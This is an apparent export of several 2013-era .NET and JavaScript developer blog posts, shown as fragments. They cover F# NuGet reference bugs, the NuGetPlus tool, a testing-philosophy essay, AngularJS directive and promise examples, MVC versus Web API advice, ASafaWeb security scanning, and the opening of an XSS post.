We assume that the F# project system then does the wrong thing by searching for the assembly name anywhere in the GAC or the output directory rather than referencing the explicit assembly NuGet is asking it to reference.</p><p>Interestingly, it looks as if the NuGet team have attempted to code a work-around for this bug from line 22 onwards. Could this be why C# projects don’t exhibit this behaviour? Unfortunately the work around doesn’t work in the F# case. We think it’s because F# doesn’t respect assembly versions and will happily replace any requested assembly with another one so long as it’s got the same simple name. At line 33, no assemblies are found in the fsproj file because the ‘AssemblyNamesMatch’ function does an exact match using all four elements of the full assembly name (simple name, version, culture, and key) and of course the assembly that the F# project system has found and added has a different version.</p><p>So, come on F# team, pull your finger out and fix the Visual Studio F# project system.

Present your project at our BDF special event in September.</p><p><a href=\"http://www.brightondigitalfestival.co.uk/\">Brighton Digital Festival</a>is a month long celebration of all things digital throughout September in the lovely city of Brighton. There’s absolutely loads going on, and one would need to take the whole month off work to see everything. Last year was a blast, and this year looks to be even better, with full time festival organisers and funding from the arts council.</p><p><a href=\"http://brightonalt.net/\">Brighton ALT NET</a>is a monthly meet-up for .NET developers. We’ve been going for several years now. Each month we meet up, drink beer, and geek out about the .NET framework and software development in general. For our September event we thought it would be excellent fun to join in with the Digital Festival and do something special. We want to showcase some of the brilliant things developers like you are doing in the local area; a show-and-tell of awesome if you will. If you’ve got a project you’d like to show off, something you’ve done at work, or in your spare time, get in touch with me. It can be anything from a Netduino mouse-trap to online community of traffic cone spotters.</p><p>Email me at mike-at-suteki.co.uk.</p>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":998}}

A guest post by my excellent colleague Michael Newton.</p><p>Michael normally blogs at<a href=\"http://blog.mavnn.co.uk\">http://blog.mavnn.co.uk</a>and works at<a href=\"http://15below.com\">15below</a>. He’s the build manager at 15below and has developed various work arounds for the F# NuGet issues we’ve been experiencing. I’ll hand over and let him explain …</p><p>In his<a href=\"http://mikehadlow.blogspot.co.uk/2013/06/nuget-install-is-broken-with-f.html\">first post</a>Mike did an excellent job explaining the bugs we found when trying to add or update NuGet references in fsproj files.</p><p>Unfortunately, the confusion doesn’t stop there. It turns out that if you examine the NuGet code, the logic for updating project files is not in NuGet.Core (the shared dll that drives core functionality like how to unpack a nupkg file) but is re-implemented in each client. This means that you get different results if you are running commands from the command line client than if you are using the Visual Studio plugin or the hosted PowerShell console. The reason for this starts to become obvious once you realise that the command line client has no parameters for specifying which project and/or solution you are working against, whilst that information is either already available in the Visual Studio plugin or required via little dropdown boxes in the hosted PowerShell console.</p><p>So, between everyday usage, preparing<a href=\"http://blog.mavnn.co.uk/coding-hygiene-moving-from-project-references-to-nuget-dependencies/\">to move some of our project references to NuGet</a>and the needs of our continuous integration we now had the following requirements:</p><ol><li>Reliable installation of NuGet references to C#, VB.net and F# projects. Preferably with an option of doing it via the command line to help scripting the project reference to NuGet reference moves.</li><li>Reliable upgrades of NuGet references in all project types. Again, a command line option would be useful.</li><li>Reliable downgrades of NuGet references in all project types. It’s painful to try a new release/pre-release of a NuGet package across a solution and then discover that you have to manually downgrade all of the projects separately if you decide not to take the new version.</li><li>Reliable removal of NuGet references turns out to be a requirement of reliable downgrades.</li><li>Sane solution wide management of references. Due to the way project references work, we need an easy way to ensure that all of the projects in a solution use the same version of any particular NuGet reference, and to check that this will not case any version conflicts. So ideally, upgrade and downgrade commands will run against a solution.</li></ol><p>Looking at our requirements in terms of what is already handled by NuGet and what is affected by the bugs that Mike discussed last time, we get:</p><ol><li>Very buggy for F# projects, fix relies on a fix to the underlying F# project type which is probably unlikely before Visual Studio version next. Also, command line installing that adds project references is not supported in nuget.exe by design.</li><li>Again, broken for F# projects. Otherwise works.</li><li>Not supported by design in any of the NuGet clients.</li><li>Appears to work.</li><li>Not supported by NuGet.</li></ol><p>As we looked at the list, it became apparent that we were unlikely to see the F# bug fixed any time soon, and even if we did there would still be several areas of functionality that we would be missing but would help us greatly. The number of options that we needed that the mainline NuGet project does not support by design swung the balance for us from a work-around or bug patch in NuGet’s Visual Studio project handling to a full blown wrapper library.</p><p>So, the<a href=\"https://github.com/mavnn/NuGetPlus\">NuGetPlus project</a>was born. As always, the name is a misnomer. Because<a href=\"http://martinfowler.com/bliki/TwoHardThings.html\">naming things is hard</a>. But the idea is to build a NuGet wrapper that provides the functionality above, and as a bonus extra for both us and the F# community, does not exhibit the annoying F# bugs from the previous post. Because the command line exe in NuGetPlus is only a very thin wrapper around the dll, it also allows you to easily call into the process from code and achieve results the same as running the command line program without having to write 100s of lines of supporting boiler plate. For those of you who have tried to use NuGet.Core directly, you’ll know that it’s a bit of an exercise in frustration actually mimicking the full behaviour of any of the clients.</p><p>It is very much still a work in progress. For example, it respects nuget.config files, but at the moment only makes use of the repository path and source list config options – we haven’t checked if we need to be supporting more. But it covers scenarios 1-4 above nicely, and we’re hoping to add 5 (solution level upgrade, downgrade and checking) fairly shortly. Although it has been developed on work time as functionality we desperately need in house, it is also a fully open source MIT licensed project that we are more than happy to receive pull requests for if there is functionality the community needs.</p><p>So whether you’re a F# NuGet user, or you just see the value of the additional functionality above, take it for a spin and let us know what you think.</p>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":1003}}

Some people are practicing TDD, but I think that’s only 46 people in the world and <a href=\"http://http//poll.pollcode.com/pdolm_result?v\">they all follow my twitter feed</a>.</p><p>&lt;/attention-seeking-headlines&gt;</p><p>We all know the common issues people have with writing large test harnesses around systems: it seems to take a long time, existing code is difficult to test, subsequent changes to code makes a lot of existing tests fail or become redundant, and the test harnesses often can become brittle, in no small part because of the abusive use of mocking.</p><p>As a recovering TDD addict, I used to tell people, like many others do, that the issue with their TDD was that they didn’t do it right. If TDD is too hard, do more TDD! In other words, if it hurts, just bang that leg with that baseball bat a bit harder, eventually you will not hurt anymore.</p><p>I will come straight out with it: this approach to unit, integration and tdd testing has, by far and large, failed. It’s over. It is time to move on. I have, and I now do <strong>VE</strong>rtical <strong>S</strong>lice <strong>T</strong>esting.</p><h2>A law of diminishing returns</h2><p>Whatever your test coverage, there is a point where more tests don’t equate more quality. Actually, let me be entirely honest here, I do not believe that a good test harness leads to better perceived quality software for your <strong>users</strong>.</p><p>The people you are trying to please with a good test harness are the ones using your system that are not on a high bandwidth medium with you. Usually that would be your team. To reduce the risk of them experiencing issues, and to increase the chance of them liking your software, you write tests so that their experience is positive.</p><p>A long time ago, I realized that testing everything is not always feasible for me, and I practice TDD all the time. A quick mental review of the teams I worked with in the last 12 years I’ve been practicing TDD also tells me that this fact is rather general.</p><h2>Mocking considered evil</h2><p>I’ve never been a big fan of mocking frameworks, for one simple reason. Simple stubbing relies on assumptions on the functioning of the mocked part of your system that rarely match reality, for no one is going to look at all the documentation of an API and decompile the code when writing a one-line stub.</p><p>As you progress in your implementation, you may learn about more scenarios you didn’t cover, and provided you are in that tiny little fraction of a percent of people refactoring your test harness as you progress your implementation, you may feedback some of that knowledge in previous tests you wrote and in your test doubles, while caressing your pet unicorn and enjoying a bit of sunshine on planet <a href=\"http://mlp.wikia.com/wiki/Equestria\">Equestria</a>. Or if you’re like the rest of us, you probably won’t.</p><h2>Increasing returns for user interfaces</h2><p>Admitting to myself that I could not fix those problems (<em>you cant fix stupid!)</em>, I started trying to understand how I could bring some of the TDD practices I enjoyed (fast feedback, repeatable tests, etc) while increasing the perception of quality, leaving any theoretical or coverage notions behind me. Instead of starting from the components I want to put under test, I start with what my users, hum, <strong>use</strong>.</p><p>If I provide users with an API, I will start by the API that I decide to publish, and consider everything else implementation details. I will only document and polish, a.k.a. test, what <strong>other people</strong> may use.</p><p>All the same, if my user interface is not an API, but some sort of UI, there is very little reason to care about all the scenarios a component may face that <strong>cannot</strong> be triggered from that user interface.</p><p>The process of discovering your user interface has an added advantage. The answer to most <em>but what if</em> questions about such a top-down approach usually unveils an additional user interface you didn’t quite know you had (looking at you, JSON SPA AJAX <em>&lt;insert buzz word of the day&gt;</em> Frankenstein “web” apps).</p><p>This is already an understood concept, and is usually referred to as acceptance testing.</p><h2>At warp speed, everything is relative</h2><p>A common issue arises from using existing acceptance-driven tools. Automating the browser is slow, automating a DB is as well, so is the file system. Each of those may also fail for reasons that have nothing to do with your code.</p><p>That would make your tests brittle and slow, which inexorably will lead to longer feedback cycles, harder to run tests, which would get us straight back to my introduction and why traditional approaches to TDD have failed.</p><p>Acceptance testing recommends, to avoid such a problem, the creation of an alternative interface allowing you to remove the browser from the equation. This is no longer necessary. With tools such as <a href=\"http://zombie.labnotes.org/\">zombie</a> being available for free, you can run an in-memory browser that behaves like a browser, runs in-memory and is increadibly fast. No more Selenium issues on running your automated test suite, no interaction with your operating system’s UI library, it’s all fast and beautiful. And if your user interface is an API, unit testing frameworks and test runners have provided those advantages for many, many years.</p><p><strong>External-facing</strong> components are now in-memory, making executing our tests fast and reliable by not triggering external systems.</p><p>I now apply the same concept to <strong>internal facing components.</strong> Instead of mocking out the inner-most elements, such as the file system, the network or a database, of my system on a per-method or per-component basis, I use libraries that give me, out of the box, an in-memory version of their system that is <strong>functionally equivalent</strong> to the real one.</p><p>It means an in-memory file system would implement the same locking primitives as the real systems, the same rules around reading, writing or seeking data, and be as close as the author of the library can make it to the real system.</p><p>In other words, a VEST-friendly library turns the unit tests of that library on it’s head. The component accessing external systems is developed alongside it’s test-double variant, and both are built to react, error-out and validate calls in the same way. The <strong>test double can be shipped</strong>. I don’t write the mocks, they come as part of the package.</p><p>There are many advantages to such an approach. The author of the library knows intimately the contract he provided you as part of his API. The act of providing an in-memory version means this knowledge is now expressed explicitly, forcing error conditions (which are very much part of a user interface in an API) to be accounted for.</p><p>A VEST-friendly library will usually end up testing explicit contracts in their test harness, so we go one step further. A library author can ship the test harnesses that exercise the contract they expose for all the conditions that are known to potentially exist, and once again, we turn test code into shipping code: if the author has written a test harness, and the author builds two components implementing an interface, the <strong>test harness for the explicit public interfaces can be shipped</strong>, as it’s probably already written.</p><p>I believe this process to be recursive and leading to the pit of success, as any library built using VEST in mind will naturally feed the VEST approach.</p><h2>Vertical Slice Testing</h2><p>The VEST approach replaces all external system calls by functionally equivalent stable and controlled ones, both at the outer-most layer (whatever exercises the user interface) and the inner-most one (whatever touches the low-level IO APIs).</p><p>By using VEST, I can focus on delivering web pages or components that focus on user-interaction, I can run the whole system on every test, and do it very quickly. I can change a lot of inside internal code without breaking existing testing scenarios. And should I wish to implement components replacing the ones in my libraries, I can do that without writing tests, because the test harness is already there, testing the contract for me.</p><p><em>Note: As I’m abroad and not available that much, don’t expect quick answers in the comments section but I’ll try my best. Subjects not covered but not forgotten: my team as a user, availability of VEST libraries, code samples, library author burden, brown field projects, generic crazy-talk, unicorns not being ponies, “you never worked in a team!”, “in an ideal world…”, etc.</em></p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/h8y7KreYZsc\" height=\"1\" width=\"1\"/>","author":"Sebastien Lambla","_id":{"$wrap":"$oid","v":1009}}

To illustrate how to put your web project’s js code under test, I created a myFunctionTests.js file -  which corresponds to the myFunctions.js file in the UnitTesting.Web MVC Project. Here is the code for myFunction.js:</p><pre class=\"brush: jscript; title: ; notranslate\" title=\"\">var myFunctions = (function () {var _functions = {};_functions.add = function (items) {var total = 0;for (var i in items){total += items[i];}return total;};return _functions;}());</pre><p>A very simple function that takes an array of numbers and adds them together. Here’s the test in the JavaScript Unit Test Project:<br />(Take note of how to reference the js file that hosts the function under test.)</p><pre class=\"brush: jscript; title: ; notranslate\" title=\"\">/// &lt;reference path=\"../../../unittesting.web/scripts/myfunctions.js\" /&gt;test(\"My Function Add Test\", function () {var result = myFunctions.add([1, 2, 3]);var expected = 6;ok(result == expected, \"Result: \" + result  + \", expected: \" + expected);});</pre><p>In addition, there is also a standard unit test project which was added when the MVC project was created.

Directives can manipulate the DOM, listen for events in the DOM, and move data between the  model and the view. For simple directives, most of the work is in the<em>link</em>function of the directive. Inside of link you’ll have access to your associated DOM element and the current scope. The DOM element is wrapped in<a href=\"http://docs.angularjs.org/api/angular.element\">jQuery lite</a>(unless you are using jQuery, then it will be wrapped with jQuery), so you can wire up events on the element, change its classes, set its text, its HTML, and so on.</p><p>In our fileInput directive, the most important DOM operation is to wire up the change event.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">var fileInput = function ($parse) {return {restrict: \"EA\",template: \"&lt;input type='file' /&gt;\",replace: true,link: function (scope, element, attrs) {var modelGet = $parse(attrs.fileInput);var modelSet = modelGet.assign;var onChange = $parse(attrs.onChange);var updateModel = function () {scope.$apply(function () {modelSet(scope, element[0].files[0]);onChange(scope);});};element.bind('change', updateModel);}};};</pre><p>The rest of the code in the<em>link</em>function is moving a selected file into the model.  This directive assumes there will be a single file. The directive can also fire off an onChange expression set in the HTML. Most of this work is easy because the $parse service in Angular can essentially turn HTML attribute values into executable code.</p><p>Using the directive in markup is easy:</p><pre class=\"brush: xml; gutter: false; toolbar: false;\">&lt;div file-input=\"file\" on-change=\"readFile()\"&gt;&lt;/div&gt;&lt;img ng-src=\"{{imageSrc}}\"/&gt;</pre><p>The associated controller just needs to implement<em>readFile</em>for the code to all work.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">var UploadController = function ($scope, fileReader) {$scope.readFile = function () {fileReader.readAsDataUrl($scope.file, $scope).then(function(result) {$scope.imageSrc = result;});};};</pre><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/OdeToCode?a=2_g_FGSmqwA:JlP_c7rnqhM:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/OdeToCode?d=yIl2AUoC8zA\" border=\"0\"></img></a></div>","author":"scott@OdeTocode.com","_id":{"$wrap":"$oid","v":1035}}

Here is an Angular service that wraps the<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/FileReader\">FileReader</a>and transforms an evented API into a promise API. The<em>onload</em>event resolves a promise, and the<em>onerror</em>event rejects a promise.

The rest of the FileReader methods are omitted for brevity, but they follow the same pattern.</p><p>One interesting event is the<em>onprogress</em>event of a FileReader. Since there is nothing to do with the promise during a progress event, the event is instead transformed and forwarded using<em>scope.$broadcast</em>. Other interested parties can use<em>$scope.$on</em>to register event handlers for such broadcasts. For example, here is a controller  using the reader the reader service.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">var UploadController = function ($scope, fileReader) {$scope.getFile = function () {$scope.progress = 0;fileReader.readAsDataUrl($scope.file, $scope).then(function(result) {$scope.imageSrc = result;});};$scope.$on(\"fileProgress\", function(e, progress) {$scope.progress = progress.loaded / progress.total;});};</pre><p>The progress value is fed into a progress element:</p><pre class=\"brush: xml; gutter: false; toolbar: false;\">&lt;progress value=\"{{progress}}\"&gt;&lt;/progress&gt;</pre><p>But how does a controller know what file to read?</p><p>That’s where we can build some file input and drag and drop directives...</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/OdeToCode?a=XLrz9B_AfzE:PpuPyUB7Z-M:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/OdeToCode?d=yIl2AUoC8zA\" border=\"0\"></img></a></div>","author":"scott@OdeTocode.com","_id":{"$wrap":"$oid","v":1036}}

Why not use a FileReader directly from the code in a model or controller?</p><p>Here are two reasons:</p><p>1) To build an adapter around FileReader that works with promises instead of call back functions (which is what this post will focus on).</p><p>2) To achieve greater flexibility. Services in AngularJS can be decorated or replaced at runtime.</p><p>To understand the advantages of #1, we’ll need to learn about promises in AngularJS. For more general information about promises, see“<a href=\"http://blog.parse.com/2013/01/29/whats-so-great-about-javascript-promises/\" target=\"_blank\">What’s so great about JavaScript Promises</a>”.</p><h3>Promises and $q</h3><p>In Angular, $q is the well known name of a promise provider, meaning you can use $q to create new promises. Here’s some code for a simple service that will perform async operations. The service requires $q as a dependency.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">(function(module) {var slowService = function ($q) {var doWork = function () {var deferred = $q.defer();// asynch work will go herereturn deferred.promise;};return {doWork: doWork};};module.factory(\"slowService\",[\"$q\", slowService]);}(angular.module(\"testApp\")));</pre><p>The<em>doWork</em>function uses<em>$q.defer</em>to create a a deferred object that represents the outstanding work for the service to complete. The function returns the deferred object’s<em>promise</em>property, which will give the caller an API for figuring out when the work is complete. This is the basic pattern most async services will use, but in order for anything interesting to happen with the promise, the service will also need to resolve or reject the promise when the async work is complete. Here is a new version of the<em>doWork</em>function .</p><pre class=\"brush: js; gutter: false; toolbar: false;\">var doWork = function (value, scope) {var deferred = $q.defer();setTimeout(function() {scope.$apply(function() {if (value === \"bad\") {deferred.reject(\"Bad call\");} else {deferred.resolve(value);}});}, 2000);return deferred.promise;};</pre><p>This version is using<em>setTimeout</em>to simulate work that takes 2000 milliseconds to complete. Normally you’d want to use the Angular $timeout service instead of setTimeout, but setTimeout is here to illustrate an important point.</p><p><strong>AngularJS promises do not propagate the result of a completed promise until the next digest cycle</strong>.</p><p>This means there has to be a call to<em>scope.$apply</em>(which will kick off a digest cycle) for the promise holder to have their callback functions invoked. With the $timeout service we wouldn’t need to use<em>$scope.apply</em>ourselves since the $timeout service will call into our code using<em>$apply</em>, but most things you’ll wrap with a service are not Angularized, so you’ll need to use<em>$apply</em>when resolving a promise.</p><h3>Promises From The Client Perspective</h3><p>Promises can lead to readable code for the client, as the code in the bottom of the controller demonstrates.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">var TestController = function($scope, $log, slowService) {var callComplete = function (result) {$scope.serviceResult = result;};var callFailed = function(reason) {$scope.serviceResult = \"Failed: \" + reason;};var logCall = function() {$log.log(\"Service call completed\");};$scope.serviceResult = \"\";slowService.doWork(\"Hello!\", $scope).then(callComplete, callFailed).always(logCall);};</pre><p>One interesting feature of AngularJS is how the data-binding infrastructure understands how to work with promises. If all you want to do is assign the resolved value to a variable for data-binding, then you can assign the variable a promise instead of using a callback and Angular will know how to pick up the resolved value and update the view.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">$scope.serviceResult =slowService.doWork(\"Hello!\", $scope).always(logCall);</pre><p>And of course chained promises can kick off new async operations and the runtime will work through the promises in a serial fashion.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">var TestController = function($scope, $log, slowService) {var saveResult = function (result) {$scope.callResults.push(result);};$scope.callResults = [];slowService.doWork(\"Hello\", $scope).then(saveResult).then(function() {return slowService.doWork(\"World\", $scope);}).then(saveResult);};</pre><p>With the above code and this bit of markup:</p><pre class=\"brush: xml; gutter: false; toolbar: false;\">&lt;li ng-repeat=\"result in callResults\"&gt;{{ result }}&lt;/li&gt;</pre><p>... then“World” appears on the screen roughly 2 seconds after“Hello”.</p><p>It’s interesting to note in the last example that if the first call fails, the 2nd call never happens (because the 2nd call is started from an“on success” function). If you want to know that the call failed you don’t have to add an error callback to every<em>.then</em>invocation.  A rejected promise will tunnel it’s way through the rest of the chain invoking error call backs as it goes, meaning you could get away with an error callback in the final .<em>then</em>.</p><p>For example, the following chained operations are doomed to failure since the service will reject the initial call with a parameter of“bad”.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">slowService.doWork(\"bad\", $scope).then(saveResult).then(function() {return slowService.doWork(\"World\", $scope);}).then(saveResult, logFailure);</pre><p>Even though the error handler<em>logFailure</em>doesn’t appear till the end of the chain, the initial failed service call will find it and the 2nd service is skipped.</p><p>In addition to serial processing, you can kick off multiple promises and wait for them to complete using $q.all.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">var promises = [];var parameters = [\"Hello\", \"World\", \"Final Call\"];angular.forEach(parameters, function(parameter) {var promise = slowService.doWork(parameter, $scope).then(saveResult);promises.push(promise);});$q.all(promises).then(function() {$scope.message = \"All calls complete!\";});</pre><p>Now that we know a little more about promises, we can move on to the business of building a service in the next post.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/OdeToCode?a=iNMHRkSs5u8:UV2GmjRX2d0:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/OdeToCode?d=yIl2AUoC8zA\" border=\"0\"></img></a></div>","author":"scott@OdeTocode.com","_id":{"$wrap":"$oid","v":1037}}

Do they work together? Should they work together? When should you use one or the other?</p><p>Here’s some general rules of thumb I use.</p><p><strong>1.</strong>If the bulk of the application is generating HTML on the server, then there is no need to use the Web API. Even if I have the occasional call from JavaScript to get JSON data for templates or an autocomplete widget, using regular MVC controllers will suffice.</p><p><img title=\"Figure 1\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: none; padding-top: 0px; padding-left: 0px; margin-left: auto; border-left: 0px; display: block; padding-right: 0px; margin-right: auto\" border=\"0\" alt=\"All ASP.NET MVC\" src=\"http://odetocode.com/images2/Windows-Live-Writer/ASP.NET-MVC-and-WebAPI_117BD/figure1_3.png\" width=\"229\" height=\"207\"></p><p>One thing to keep in mind is that the Web API is a separate framework with its own dependency resolver, action filters, routing rules, model binding, and model serialization settings. Bringing in a 2nd set of all these components just to satisfy a few JSON requests from script is an increase in complexity.</p><p><strong>2.</strong>If an application is loaded with JavaScripts and JSON flows back and forth to the server frequently, or if I have to support more clients than just the script in the pages from my site (some of whom might want XML or other formats), then it is a good time to create HTTP service endpoints and a more formal service API. These scenarios are just what Web API is made for and both MVC controllers and Web API controllers will happily coexist in the same project.</p><p><img title=\"Figure 2\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: none; padding-top: 0px; padding-left: 0px; margin-left: auto; border-left: 0px; display: block; padding-right: 0px; margin-right: auto\" border=\"0\" alt=\"MVC With Web API\" src=\"http://odetocode.com/images2/Windows-Live-Writer/ASP.NET-MVC-and-WebAPI_117BD/figure2_3.png\" width=\"391\" height=\"213\"></p><p>Although the Web API does add some complexity, it is also easier to build a proper service with the Web API. I can use the verb based routing and content negotiation features to build services oriented around resources, and the OData support and automatic help page generation of the Web API framework can come in handy.</p><p><strong>3</strong>. I’m not a big fan of services for services sake. In the previous two figures, the MVC UI and Web API pieces are drawn to suggest how they are only facades on top of a core application. Most of the interesting things are defined in the application and not in the UI and Web API layers. When someone suggests that the MVC controllers should talk over HTTP to Web API controllers in the same application, all I can think about is putting a façade over a façade, which seems silly.</p><p> </p><p><img title=\"Figure 3\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: none; padding-top: 0px; padding-left: 0px; margin-left: auto; border-left: 0px; display: block; padding-right: 0px; margin-right: auto\" border=\"0\" alt=\"Tears for tiers\" src=\"http://odetocode.com/images2/Windows-Live-Writer/ASP.NET-MVC-and-WebAPI_117BD/figure3_3.png\" width=\"352\" height=\"278\"></p><p>There are some valid reasons to go with such an architecture (see #4), but be cautious when creating new tiers.</p><p><strong>4</strong>. It is more than reasonable to integrate multiple applications or large pieces of functionality using services and the Web API. This is a scenario where having web service calls inside or behind the MVC controllers of an application is almost required.</p><p><img title=\"Figure 4\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: none; padding-top: 0px; padding-left: 0px; margin-left: auto; border-left: 0px; display: block; padding-right: 0px; margin-right: auto\" border=\"0\" alt=\"Big Enterprise\" src=\"http://odetocode.com/images2/Windows-Live-Writer/ASP.NET-MVC-and-WebAPI_117BD/figure4_3.png\" width=\"627\" height=\"368\"></p><p>The above type of scenario usually involves large applications and multiple teams. Using a service layer allows for more flexibility and scale compared to sharing binaries, or integrating at the database level (shudder with fear).</p><h3>Parting Words</h3><p>There is no quick and easy answer to the questions in this space. If you are looking for guidance, hopefully I’ve provided some rules of thumb you can use to start thinking about the answer for your specific scenario.

I didn’t find any of these in the current release.</p><p>Most worrisome is how there doesn’t appear to be any extensibility story for the tools. Framework oriented plugins for Knockout and Angular are popular in other browsers because they allow developers to work at a level above the code to see what is happening on a page. The ability to use simple HTML and JavaScript to create these types of plugins is what makes the other tools so popular. The IE dev tools will need a better extensibility story to keep web developers happy.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/OdeToCode?a=NuG7MLsNvOE:byCZD3mNAgk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/OdeToCode?d=yIl2AUoC8zA\" border=\"0\"></img></a></div>","author":"scott@OdeTocode.com","_id":{"$wrap":"$oid","v":1040}}

What I mean by this is that it’s a continuous process and thinking that you only need to just implement some secure coding standards or scan the website once before go live leaves a great big hole in your process.</p><p>For example, the other day I wrote about how<a href=\"http://www.troyhunt.com/2013/05/security-is-hard-insecurity-is-easy.html\">insecurity is easy</a>where I talked about how Black and Decker had exposed ELMAH logs. This is the tiniest of security misconfigurations which can easily happen at any time but it meant that they ended up with the credentials from a significant portion of their customer base publicly accessible – ouch! Ok, this also involved storing plain text passwords in cookies in order to facilitate the “remember me” function (no, really), but the point is in how easy it was to make a simple change that blew a massive hole in the side of their security profile.</p><p>This brings me to the point of the post: security misconfiguration happens and you need to start looking for it bang after you publish the site. Exposed ELMAH logs is one thing but simple security misconfiguration changes you can screw up on release of an ASP.NET website go well beyond that; custom errors, tracing, request validation and the way your cookies are configured to name but a few. Each of these can be configured to leave a site vulnerable in literally just a few seconds.</p><p>For the last couple of years I’ve provided a service to detect these problems in a live site –<a href=\"https://asafaweb.com\">ASafaWeb</a>. The value proposition of ASafaWeb has always been that on demand, you can scan your live ASP.NET website and it will report on these security misconfigurations. Now I’m very happy to share how ASafaWeb has been integrated into<a href=\"https://oncheckin.com/\">OnCheckin</a>(the brainchild of<a href=\"http://www.diaryofaninja.com/\">Doug Rathbone</a>) to provide continuous deployment for ASP.NET websites as a cloud-based service.</p><p><img width=\"492\" height=\"101\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"OnCheckin - Cloud Powered Deployment\" src=\"http://lh4.ggpht.com/-QewvOaRCVAE/UcIqJJcxP2I/AAAAAAAAFa0/Lq_jFP5xOfA/OriginalLogo2.png?imgmax=800\" border=\"0\"></p><a name='more'></a><p>Here’s how it works: Firstly, you plug it into source control:</p><p><img width=\"791\" height=\"636\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Configuring source control\" src=\"http://lh3.ggpht.com/-9gS7OyP31vg/UcIqJ9H9scI/AAAAAAAAFa8/yVX3JMb2QA0/image2.png?imgmax=800\" border=\"0\"></p><p>Then you configure the deployment:</p><p><img width=\"785\" height=\"968\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Configuring deployment\" src=\"http://lh6.ggpht.com/-dLELbPIfWuk/UcIqKXe-9EI/AAAAAAAAFbE/pfNLEqbO4OA/image5.png?imgmax=800\" border=\"0\"></p><p>Then finally you review everything and tick the box to run the ASafaWeb scan after every deployment:</p><p><img width=\"788\" height=\"888\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Configuring ASafaWeb\" src=\"http://lh5.ggpht.com/-Uyoj7L3jeDU/UcIqLFxOwbI/AAAAAAAAFbM/wUxPb48a3ao/image31.png?imgmax=800\" border=\"0\"></p><p>That’s it – job done! Now each time the scan runs there’ll be a little ASafaWeb tab and a nice report on how the scan went:</p><p><img width=\"880\" height=\"522\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"The ASafaWeb report in OnCheckin\" src=\"http://lh3.ggpht.com/-xlPwH-zRX9Q/UcIqLwBN_AI/AAAAAAAAFbU/EtXZ9ZXtZWk/image11.png?imgmax=800\" border=\"0\"></p><p>What I really like about this is the continuous nature of the process. Every time that build runs, the site is going to get scanned and so long as you’re keeping an eye on the results you shouldn’t have sneaky security misconfigurations making their way through to production. Well at least not for very long!</p><p>The other thing about this integration is that it’s another step towards publicly releasing the ASafaWeb API. Yes, there’s an API and in fact it’s been used extensively as the magic behind the<a href=\"http://www.troyhunt.com/2012/08/welcome-to-asafaweb-scheduler.html\">ASafaWeb Scheduler</a>which gives you the ability to scan your sites on a regular basis (I mentioned it’s free, right?!). The intention has always been to open the API up for anyone to consume I reckon including it into the continuous integration cycle is a fantastic use-case.</p><p>To that effect, if you’re involved in a similar project and would like to integrate ASafaWeb then I’d love to hear from you. I’m happy to open it up to beta testers who want to contribute feedback and I know there are a<em>ton</em>of good ideas out there for how it might be used.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/0sjQHMWcphI\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1128}}

You’ll very often see<em>some</em>attempt at mitigating the risk but then find it’s easily circumvented because the developers weren’t fully aware of the attack vectors.</p><p>Last week someone flicked me over a great example of this after having read my previous post<a href=\"http://www.troyhunt.com/2012/07/heres-why-we-keep-getting-hacked-clear.html\">Here’s why we keep getting hacked – clear and present Billabong failures</a>. In that post I pointed out the ease with which you could decorate Billabong’s registration page with the beautiful Miranda Kerr and a slightly stoned looking Bugs Bunny. In this post here, the ramifications of getting XSS wrong means stealing someone’s session and pulling out their personal details, all because of this:</p><p><img width=\"866\" height=\"534\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Stealing Billabong cookies\" src=\"http://lh3.ggpht.com/-HQJEtHP7vlU/UaZit9xh1KI/AAAAAAAAFYo/Zs_aoCI6mN4/image12.png?imgmax=800\" border=\"0\"></p><p>I’ll come back to that, let’s first go back to the title and focus on input sanitisation and output encoding contexts. If XSS is an entirely new concept to you, start by taking a look at<a href=\"http://www.troyhunt.com/2010/05/owasp-top-10-for-net-developers-part-2.html\">my post on it here</a>then come 